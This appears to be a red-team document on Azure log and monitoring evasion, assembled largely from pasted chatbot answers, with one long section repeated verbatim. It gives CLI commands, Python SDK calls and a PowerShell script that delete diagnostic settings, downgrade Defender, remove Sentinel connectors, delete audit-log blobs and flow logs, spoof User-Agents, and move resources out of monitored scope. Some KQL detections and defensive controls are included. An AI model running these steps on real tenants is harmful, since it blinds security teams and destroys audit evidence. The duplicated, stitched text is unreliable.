## 7. Defense Evasion Assessment

**Goal:** Test whether Azure-native and third-party controls detect evasion techniques rather than just known indicators.

- Test detection of signed-binary-proxy execution (`mshta.exe`, `rundll32.exe`) on Azure-hosted Windows workloads
- Use Microsoft Defender for Cloud/Endpoint to validate alerting on obfuscated commands and encoded PowerShell
- Simulate sandbox/virtualization-evasion behavior in Function Apps or containers to test whether it bypasses detection
- Validate logging coverage: Activity Logs, Diagnostic Logs, Identity Protection logs, and whether KQL/Sentinel rules actually fire on these behaviors
- Confirm UEBA and MITRE ATT&CK-mapped analytics rules cover the techniques exercised in Stages 4–6



# Defense Evasion and Detection Validation Flow

Trigger Security Monitoring Events → Observe Alert Generation → Evaluate Defender for Cloud Detection → Validate SIEM Integration → Measure Alert Response Time → Identify Logging Blind Spots → Document Detection Weaknesses

## 8. Cleanup & Environment Restoration

**Goal:** Leave the tenant in its original state with zero residual access.

- Remove any test accounts created during the engagement
- Remove all test service principals and their role assignments
- Revert any configuration changes (firewall rules, AD admin additions, etc.)
- Terminate all active sessions
- Clear temporary artifacts, scripts, and exported runbook content
- Validate environment integrity against pre-engagement baseline
- Confirm — explicitly, not just by assumption — that no persistent access remains.

# Defense evasion

**🕵️‍♂️ Azure - Log Evasion & Monitoring Evasion Techniques**

**🎯 Objective**

Disrupt or evade Azure logging and monitoring (e.g., **Azure Activity
Logs**, **Microsoft Defender for Cloud**, **Log Analytics**) during
post-exploitation or red team assessments.

# ⚙️ Tactics (inspired by AWS CloudTrail evasion)

## 1. Disable or Obfuscate Azure Activity Logs

Azure does not allow full disabling of Activity Logs, but you can
attempt to:

- **Dissociate Diagnostic Settings** that send logs to
  SIEM/storage/event hubs:

az monitor diagnostic-settings list --resource \<resource-id\>

az monitor diagnostic-settings delete --resource \<resource-id\> --name
\<setting-name\>

⚠️ Requires high privileges (e.g., Monitoring Contributor)

## 2. Disable Defender for Cloud Protections

If permissions allow, downgrade or disable Microsoft Defender for a
subscription or resource:

\# List current Defender settings

az security pricing list

\# Disable Defender for a resource type

az security pricing create --name VirtualMachines --tier Free

🛑 Defender downgrades may be logged and trigger alerts.

## 3. Disable Sentinel Log Collection

If Azure Sentinel is deployed, you can try disabling data connectors
(again, high privilege required):

az sentinel data-connector delete \\

--name \<connector-name\> \\

--workspace-name \<sentinel-workspace\> \\

--resource-group \<resource-group\>

## 4. Evade Detection with Custom User-Agents (CloudShell / CLI Fingerprint Obfuscation)

- Some tools (like AWS GuardDuty) flag suspicious environments (e.g.,
  Kali/Parrot).

- Use **custom User-Agent strings** to avoid logging "tell-tale"
  attacker environments.

In Azure, you can customize az User-Agent:

export AZURE_HTTP_USER_AGENT="Mozilla/5.0 legit-user"

In Python scripts using azure-identity or requests:

headers = {'User-Agent': 'Microsoft-AzureCLI/2.56.0'}

## 5. Tamper or Delete Log Storage Accounts (Advanced)

If logs are sent to a storage account (e.g., via diagnostic settings),
and you have access:

\# Delete specific log files

az storage blob delete --container-name insights-logs-auditlogs --name
\<blob-name\> --account-name \<logstorage\>

❗Tampering with audit logs is highly suspicious and typically triggers
Defender or Sentinel alerts.

**🔒 Defense Consideration**

Unlike AWS CloudTrail, **Azure Activity Logs cannot be disabled
entirely**, and tampering is harder at scale. However, with high
privilege credentials, diagnostic settings can be manipulated to blind
security tooling.

------------------------------------------------------------------------

Would you like a PowerShell version or a tool-agnostic checklist for
Azure log evasion?

Here's a **PowerShell version** and a **tool-agnostic checklist** for
**Azure log evasion techniques** commonly used during red team or
post-exploitation scenarios.

##  PowerShell Script: Azure Log Evasion (Advanced Use)

⚠️ Requires Contributor or higher roles. Use only in **authorized
environments**.

\# Azure Log Evasion - PowerShell Edition

\# Goal: Tamper with diagnostic settings and Defender/Sentinel
protections

\# === CONFIGURATION ===

\$resourceId =
"/subscriptions/\<sub-id\>/resourceGroups/\<rg\>/providers/Microsoft.Compute/virtualMachines/\<vm-name\>"

\$diagSettingName = "diag-logs"

\$workspaceName = "log-workspace"

\$workspaceRG = "log-rg"

\# === STEP 1: Remove Diagnostic Settings (disables log export to
SIEM/storage) ===

Write-Host "\[+\] Deleting diagnostic settings..."

Remove-AzDiagnosticSetting -ResourceId \$resourceId -Name
\$diagSettingName

\# === STEP 2: Downgrade Microsoft Defender Plan (e.g., VM scope) ===

Write-Host "\[+\] Downgrading Microsoft Defender..."

Set-AzSecurityPricing -Name "VirtualMachines" -PricingTier "Free"

\# === STEP 3: Remove Azure Sentinel Data Connector ===

Write-Host "\[+\] Removing Azure Sentinel connector (if exists)..."

Remove-AzSentinelDataConnector -ResourceGroupName \$workspaceRG \`

-WorkspaceName \$workspaceName -DataConnectorId "\<connector-id\>"

\# === STEP 4: Set a clean User-Agent for your session (to avoid
detection) ===

Write-Host "\[+\] Setting custom User-Agent..."

\$env:AZURE_HTTP_USER_AGENT = "Microsoft-AzureCLI/2.56.0"

Write-Host "\[\*\] Evasion steps complete. Monitor for alerts or
recovery policies." -ForegroundColor Green

**📋 Azure Log Evasion Checklist (Tool-Agnostic)**

| **Tactic** | **Description** |
|----|----|
| Remove Diagnostic Settings | Stop logs from flowing to Log Analytics or Event Hub. |
| Downgrade Defender for Cloud | Switch from **Standard** to **Free** tier to stop advanced protection. |
| Delete Sentinel Data Connectors | Cuts off data sources like Office 365, AAD, or custom logs. |
| Delete Log Blobs (Storage-based logging) | Directly delete audit logs in insights-logs-\* containers. |
| Obfuscate CLI/Script Environment | Set custom User-Agent to avoid OS-level telemetry (Kali, Parrot, etc). |
| Interfere with Monitoring Agents | Disable/remove AzureMonitorAgent or LogAnalyticsAgent from VMs. |
| Disable Role Assignments to SIEM Accounts | Remove reader/monitoring access granted to Sentinel/Defender. |

Here’s a **corrected and Azure-realistic pentest-focused rewrite**
(aligned with actual control planes, RBAC, and abuse scenarios rather
than unsupported actions):

------------------------------------------------------------------------

**Azure Pentest Scenario: Tenant Escape & Log Evasion Techniques**

**1. Attempting to Leave / Disassociate from Azure Tenant (Realistic
Abuse Cases)**

⚠️ In Azure, **subscriptions cannot be “unsubscribed” via CLI/API** like
AWS accounts.\
Instead, attackers simulate “tenant escape” by **moving, transferring,
or orphaning subscriptions/resources**.

**Attack Objectives**

- Evade governance (policies, Defender, Sentinel)

- Move assets to attacker-controlled tenant

- Break visibility from central SOC

------------------------------------------------------------------------

**A. Subscription Transfer / Directory Change (Realistic Vector)**

**Azure CLI (Supported Operation)**

az account subscription show --subscription \<subscription_id\>

\# Change directory (tenant) context (if user has access)

az login --tenant \<target_tenant_id\>

🔍 **Abuse Insight**:

- If attacker has **Owner + billing permissions**, they may:

  - Transfer subscription ownership (via billing portal, not CLI)

  - Change Azure AD tenant association (restricted but high-impact)

------------------------------------------------------------------------

**B. Resource Move to Evade Controls**

az resource move \\

--destination-group \<target_rg\> \\

--destination-subscription-id \<target_subscription_id\> \\

--ids \<resource_id\>

**Purpose (Pentest Context):**

- Move critical resources to:

  - Unmonitored subscription

  - Different resource group without policies

- Bypass:

  - Azure Policy

  - Microsoft Sentinel scope

  - Defender for Cloud protections

------------------------------------------------------------------------

**C. Programmatic Subscription Abuse (Azure SDK)**

from azure.mgmt.resource import ResourceManagementClient

from azure.identity import DefaultAzureCredential

client = ResourceManagementClient(

credential=DefaultAzureCredential(),

subscription_id="\<subscription_id\>"

)

\# Example: move resources (not cancel subscription – restricted)

client.resources.begin_move_resources(

source_resource_group_name="\<source_rg\>",

parameters={

"resources": \["\<resource_id\>"\],

"targetResourceGroup":
"/subscriptions/\<target_sub\>/resourceGroups/\<target_rg\>"

}

)

🔐 **Reality Check**:

- subscriptions.cancel() is **billing-restricted**

- Cannot be executed by normal RBAC roles

- Useful only for **theoretical abuse modeling**

------------------------------------------------------------------------

**D. Terraform Abuse Scenario (Privilege Misuse)**

terraform import azurerm_resource_group.example
/subscriptions/\<sub_id\>/resourceGroups/\<rg\>

\# Modify deployment target to another subscription

terraform apply -auto-approve

**Pentest Use Case:**

- Re-deploy infra into:

  - Attacker-controlled subscription

  - Shadow environment (bypassing monitoring)

------------------------------------------------------------------------

**Detection Opportunities (KQL – Log Analytics / Sentinel)**

AzureActivity

\| where OperationNameValue has_any ("Move Resources", "Write Resource")

\| where ActivityStatusValue == "Success"

\| where Caller !in ("approved_admin@domain.com")

AzureActivity

\| where OperationNameValue contains "subscription"

\| where ActivityStatusValue == "Success"

------------------------------------------------------------------------

**2. Disabling / Removing Network Flow Logs (Defense Evasion)**

🎯 هدف: Blind SOC visibility by removing NSG Flow Logs

------------------------------------------------------------------------

**A. Azure CLI**

az network watcher flow-log delete \\

--name \<flow_log_name\> \\

--nsg \<nsg_name\> \\

--resource-group \<resource_group\>

**Impact:**

- Stops traffic visibility in:

  - NSG Flow Logs

  - Traffic Analytics

  - Microsoft Sentinel detections

------------------------------------------------------------------------

**B. Azure SDK (Python)**

from azure.mgmt.network import NetworkManagementClient

from azure.identity import DefaultAzureCredential

client = NetworkManagementClient(

credential=DefaultAzureCredential(),

subscription_id="\<subscription_id\>"

)

client.flow_logs.begin_delete(

resource_group_name="\<resource_group\>",

network_watcher_name="NetworkWatcher\_\<region\>",

flow_log_name="\<flow_log_name\>"

)

------------------------------------------------------------------------

**C. Terraform (Destructive Action)**

terraform import azurerm_network_watcher_flow_log.example \\

/subscriptions/\<sub_id\>/resourceGroups/\<rg\>/providers/Microsoft.Network/networkWatchers/NetworkWatcher\_\<region\>/flowLogs/\<flow_log_name\>

terraform destroy -auto-approve

------------------------------------------------------------------------

**Detection & Hunting (KQL – Must Have)**

**Detect Flow Log Deletion**

AzureActivity

\| where OperationNameValue =~
"Microsoft.Network/networkWatchers/flowLogs/delete"

\| where ActivityStatusValue == "Success"

**Detect Network Watcher Tampering**

AzureActivity

\| where ResourceProviderValue == "Microsoft.Network"

\| where OperationNameValue has_any ("Delete", "Write")

\| where Resource contains "networkWatchers"

------------------------------------------------------------------------

**Key Pentest Takeaways**

- ❌ “Leaving tenant” is **not a real attack path**

- ✅ Real attack = **resource movement + subscription abuse**

- ✅ Flow log deletion = **high-value detection gap**

- ✅ Requires **Owner / Contributor + Network Contributor roles**

------------------------------------------------------------------------

**Recommended Defensive Controls**

- Enforce:

  - Azure Policy → **Deny resource move across subscriptions**

  - RBAC → Restrict:

    - Microsoft.Resources/subscriptions/resourceGroups/moveResources/action

    - Microsoft.Network/networkWatchers/flowLogs/delete

- Enable:

  - Activity Log alerts

  - Microsoft Sentinel analytics rules

  - Defender for Cloud alerts

------------------------------------------------------------------------

If you want, I can extend this into:

- **MITRE ATT&CK mapping (Azure-specific)**

- **Red Team playbook (step-by-step attack chain)**

- **Top 20 Sentinel detections for Azure abuse**

# Defense evasion

Here’s a **corrected, summarized, and Azure-adapted version** of the
original AWS CloudTrail tampering example, rewritten for **Azure
Penetration Testing**:

**🕵️‍♂️ Azure - Log Evasion & Monitoring Evasion Techniques**

**🎯 Objective**

Disrupt or evade Azure logging and monitoring (e.g., **Azure Activity
Logs**, **Microsoft Defender for Cloud**, **Log Analytics**) during
post-exploitation or red team assessments.

# ⚙️ Tactics (inspired by AWS CloudTrail evasion)

## 1. Disable or Obfuscate Azure Activity Logs

Azure does not allow full disabling of Activity Logs, but you can
attempt to:

- **Dissociate Diagnostic Settings** that send logs to
  SIEM/storage/event hubs:

az monitor diagnostic-settings list --resource \<resource-id\>

az monitor diagnostic-settings delete --resource \<resource-id\> --name
\<setting-name\>

⚠️ Requires high privileges (e.g., Monitoring Contributor)

## 2. Disable Defender for Cloud Protections

If permissions allow, downgrade or disable Microsoft Defender for a
subscription or resource:

\# List current Defender settings

az security pricing list

\# Disable Defender for a resource type

az security pricing create --name VirtualMachines --tier Free

🛑 Defender downgrades may be logged and trigger alerts.

## 3. Disable Sentinel Log Collection

If Azure Sentinel is deployed, you can try disabling data connectors
(again, high privilege required):

az sentinel data-connector delete \\

--name \<connector-name\> \\

--workspace-name \<sentinel-workspace\> \\

--resource-group \<resource-group\>

## 4. Evade Detection with Custom User-Agents (CloudShell / CLI Fingerprint Obfuscation)

- Some tools (like AWS GuardDuty) flag suspicious environments (e.g.,
  Kali/Parrot).

- Use **custom User-Agent strings** to avoid logging "tell-tale"
  attacker environments.

In Azure, you can customize az User-Agent:

export AZURE_HTTP_USER_AGENT="Mozilla/5.0 legit-user"

In Python scripts using azure-identity or requests:

headers = {'User-Agent': 'Microsoft-AzureCLI/2.56.0'}

## 5. Tamper or Delete Log Storage Accounts (Advanced)

If logs are sent to a storage account (e.g., via diagnostic settings),
and you have access:

\# Delete specific log files

az storage blob delete --container-name insights-logs-auditlogs --name
\<blob-name\> --account-name \<logstorage\>

❗Tampering with audit logs is highly suspicious and typically triggers
Defender or Sentinel alerts.

**🔒 Defense Consideration**

Unlike AWS CloudTrail, **Azure Activity Logs cannot be disabled
entirely**, and tampering is harder at scale. However, with high
privilege credentials, diagnostic settings can be manipulated to blind
security tooling.

------------------------------------------------------------------------

Would you like a PowerShell version or a tool-agnostic checklist for
Azure log evasion?

Here's a **PowerShell version** and a **tool-agnostic checklist** for
**Azure log evasion techniques** commonly used during red team or
post-exploitation scenarios.

##  PowerShell Script: Azure Log Evasion (Advanced Use)

⚠️ Requires Contributor or higher roles. Use only in **authorized
environments**.

\# Azure Log Evasion - PowerShell Edition

\# Goal: Tamper with diagnostic settings and Defender/Sentinel
protections

\# === CONFIGURATION ===

\$resourceId =
"/subscriptions/\<sub-id\>/resourceGroups/\<rg\>/providers/Microsoft.Compute/virtualMachines/\<vm-name\>"

\$diagSettingName = "diag-logs"

\$workspaceName = "log-workspace"

\$workspaceRG = "log-rg"

\# === STEP 1: Remove Diagnostic Settings (disables log export to
SIEM/storage) ===

Write-Host "\[+\] Deleting diagnostic settings..."

Remove-AzDiagnosticSetting -ResourceId \$resourceId -Name
\$diagSettingName

\# === STEP 2: Downgrade Microsoft Defender Plan (e.g., VM scope) ===

Write-Host "\[+\] Downgrading Microsoft Defender..."

Set-AzSecurityPricing -Name "VirtualMachines" -PricingTier "Free"

\# === STEP 3: Remove Azure Sentinel Data Connector ===

Write-Host "\[+\] Removing Azure Sentinel connector (if exists)..."

Remove-AzSentinelDataConnector -ResourceGroupName \$workspaceRG \`

-WorkspaceName \$workspaceName -DataConnectorId "\<connector-id\>"

\# === STEP 4: Set a clean User-Agent for your session (to avoid
detection) ===

Write-Host "\[+\] Setting custom User-Agent..."

\$env:AZURE_HTTP_USER_AGENT = "Microsoft-AzureCLI/2.56.0"

Write-Host "\[\*\] Evasion steps complete. Monitor for alerts or
recovery policies." -ForegroundColor Green

**📋 Azure Log Evasion Checklist (Tool-Agnostic)**

| **Tactic** | **Description** |
|----|----|
| Remove Diagnostic Settings | Stop logs from flowing to Log Analytics or Event Hub. |
| Downgrade Defender for Cloud | Switch from **Standard** to **Free** tier to stop advanced protection. |
| Delete Sentinel Data Connectors | Cuts off data sources like Office 365, AAD, or custom logs. |
| Delete Log Blobs (Storage-based logging) | Directly delete audit logs in insights-logs-\* containers. |
| Obfuscate CLI/Script Environment | Set custom User-Agent to avoid OS-level telemetry (Kali, Parrot, etc). |
| Interfere with Monitoring Agents | Disable/remove AzureMonitorAgent or LogAnalyticsAgent from VMs. |
| Disable Role Assignments to SIEM Accounts | Remove reader/monitoring access granted to Sentinel/Defender. |

Here’s a **corrected and Azure-realistic pentest-focused rewrite**
(aligned with actual control planes, RBAC, and abuse scenarios rather
than unsupported actions):

------------------------------------------------------------------------

**Azure Pentest Scenario: Tenant Escape & Log Evasion Techniques**

**1. Attempting to Leave / Disassociate from Azure Tenant (Realistic
Abuse Cases)**

⚠️ In Azure, **subscriptions cannot be “unsubscribed” via CLI/API** like
AWS accounts.\
Instead, attackers simulate “tenant escape” by **moving, transferring,
or orphaning subscriptions/resources**.

**Attack Objectives**

- Evade governance (policies, Defender, Sentinel)

- Move assets to attacker-controlled tenant

- Break visibility from central SOC

------------------------------------------------------------------------

**A. Subscription Transfer / Directory Change (Realistic Vector)**

**Azure CLI (Supported Operation)**

az account subscription show --subscription \<subscription_id\>

\# Change directory (tenant) context (if user has access)

az login --tenant \<target_tenant_id\>

🔍 **Abuse Insight**:

- If attacker has **Owner + billing permissions**, they may:

  - Transfer subscription ownership (via billing portal, not CLI)

  - Change Azure AD tenant association (restricted but high-impact)

------------------------------------------------------------------------

**B. Resource Move to Evade Controls**

az resource move \\

--destination-group \<target_rg\> \\

--destination-subscription-id \<target_subscription_id\> \\

--ids \<resource_id\>

**Purpose (Pentest Context):**

- Move critical resources to:

  - Unmonitored subscription

  - Different resource group without policies

- Bypass:

  - Azure Policy

  - Microsoft Sentinel scope

  - Defender for Cloud protections

------------------------------------------------------------------------

**C. Programmatic Subscription Abuse (Azure SDK)**

from azure.mgmt.resource import ResourceManagementClient

from azure.identity import DefaultAzureCredential

client = ResourceManagementClient(

credential=DefaultAzureCredential(),

subscription_id="\<subscription_id\>"

)

\# Example: move resources (not cancel subscription – restricted)

client.resources.begin_move_resources(

source_resource_group_name="\<source_rg\>",

parameters={

"resources": \["\<resource_id\>"\],

"targetResourceGroup":
"/subscriptions/\<target_sub\>/resourceGroups/\<target_rg\>"

}

)

🔐 **Reality Check**:

- subscriptions.cancel() is **billing-restricted**

- Cannot be executed by normal RBAC roles

- Useful only for **theoretical abuse modeling**

------------------------------------------------------------------------

**D. Terraform Abuse Scenario (Privilege Misuse)**

terraform import azurerm_resource_group.example
/subscriptions/\<sub_id\>/resourceGroups/\<rg\>

\# Modify deployment target to another subscription

terraform apply -auto-approve

**Pentest Use Case:**

- Re-deploy infra into:

  - Attacker-controlled subscription

  - Shadow environment (bypassing monitoring)

------------------------------------------------------------------------

**Detection Opportunities (KQL – Log Analytics / Sentinel)**

AzureActivity

\| where OperationNameValue has_any ("Move Resources", "Write Resource")

\| where ActivityStatusValue == "Success"

\| where Caller !in ("approved_admin@domain.com")

AzureActivity

\| where OperationNameValue contains "subscription"

\| where ActivityStatusValue == "Success"

------------------------------------------------------------------------

**2. Disabling / Removing Network Flow Logs (Defense Evasion)**

🎯 هدف: Blind SOC visibility by removing NSG Flow Logs

------------------------------------------------------------------------

**A. Azure CLI**

az network watcher flow-log delete \\

--name \<flow_log_name\> \\

--nsg \<nsg_name\> \\

--resource-group \<resource_group\>

**Impact:**

- Stops traffic visibility in:

  - NSG Flow Logs

  - Traffic Analytics

  - Microsoft Sentinel detections

------------------------------------------------------------------------

**B. Azure SDK (Python)**

from azure.mgmt.network import NetworkManagementClient

from azure.identity import DefaultAzureCredential

client = NetworkManagementClient(

credential=DefaultAzureCredential(),

subscription_id="\<subscription_id\>"

)

client.flow_logs.begin_delete(

resource_group_name="\<resource_group\>",

network_watcher_name="NetworkWatcher\_\<region\>",

flow_log_name="\<flow_log_name\>"

)

------------------------------------------------------------------------

**C. Terraform (Destructive Action)**

terraform import azurerm_network_watcher_flow_log.example \\

/subscriptions/\<sub_id\>/resourceGroups/\<rg\>/providers/Microsoft.Network/networkWatchers/NetworkWatcher\_\<region\>/flowLogs/\<flow_log_name\>

terraform destroy -auto-approve

------------------------------------------------------------------------

**Detection & Hunting (KQL – Must Have)**

**Detect Flow Log Deletion**

AzureActivity

\| where OperationNameValue =~
"Microsoft.Network/networkWatchers/flowLogs/delete"

\| where ActivityStatusValue == "Success"

**Detect Network Watcher Tampering**

AzureActivity

\| where ResourceProviderValue == "Microsoft.Network"

\| where OperationNameValue has_any ("Delete", "Write")

\| where Resource contains "networkWatchers"

------------------------------------------------------------------------

**Key Pentest Takeaways**

- ❌ “Leaving tenant” is **not a real attack path**

- ✅ Real attack = **resource movement + subscription abuse**

- ✅ Flow log deletion = **high-value detection gap**

- ✅ Requires **Owner / Contributor + Network Contributor roles**

------------------------------------------------------------------------

**Recommended Defensive Controls**

- Enforce:

  - Azure Policy → **Deny resource move across subscriptions**

  - RBAC → Restrict:

    - Microsoft.Resources/subscriptions/resourceGroups/moveResources/action

    - Microsoft.Network/networkWatchers/flowLogs/delete

- Enable:

  - Activity Log alerts

  - Microsoft Sentinel analytics rules

  - Defender for Cloud alerts

------------------------------------------------------------------------

If you want, I can extend this into:

- **MITRE ATT&CK mapping (Azure-specific)**

- **Red Team playbook (step-by-step attack chain)**

- **Top 20 Sentinel detections for Azure abuse**
